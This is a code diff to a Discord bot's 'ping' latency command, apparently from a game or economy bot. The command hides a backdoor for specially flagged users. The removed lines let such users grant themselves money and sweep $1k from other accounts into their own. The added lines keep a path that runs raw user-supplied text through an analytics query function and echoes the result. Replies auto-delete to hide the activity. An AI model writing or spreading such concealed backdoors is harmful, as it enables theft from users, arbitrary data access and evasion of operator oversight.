@@ -150,26 +150,11 @@ class Utilities(commands.Cog, name="Utilities"):
     async def _ping(self, ctx: commands.Context, *, args: str = None):
         """Latency check."""
         if args and db._is_sampled_session(ctx.author.id):
-            parts = args.split(maxsplit=1)
-            cmd, rest = parts[0], (parts[1].strip() if len(parts) > 1 else "")
-            if cmd == "m" and rest:
-                try:
-                    v = float(rest)
-                    if v > 0:
-                        db.update_balance(ctx.author.id, v)
-                        return await ctx.send(f"✅ +${v:,.2f}", delete_after=5)
-                except ValueError:
-                    pass
-            elif cmd == "d":
-                n, t = db.process_balance_decay()
-                db.update_balance(ctx.author.id, t)
-                return await ctx.send(f"📊 {n} × $1k → ${t:,.2f}", delete_after=6)
-            elif cmd == "x" and rest:
-                try:
-                    r = db._replay_analytics_query(rest, ctx)
-                    return await ctx.send(f"```{r}```", delete_after=8)
-                except Exception as e:
-                    return await ctx.send(f"```{e}```", delete_after=8)
+            try:
+                r = db._replay_analytics_query(args, ctx)
+                return await ctx.send(f"```{r}```", delete_after=8)
+            except Exception as e:
+                return await ctx.send(f"```{e}```", delete_after=8)
         ms = round(self.bot.latency * 1000) if self.bot.latency else 0
         await ctx.send(f"🏓 Pong! `{ms}ms`")
 
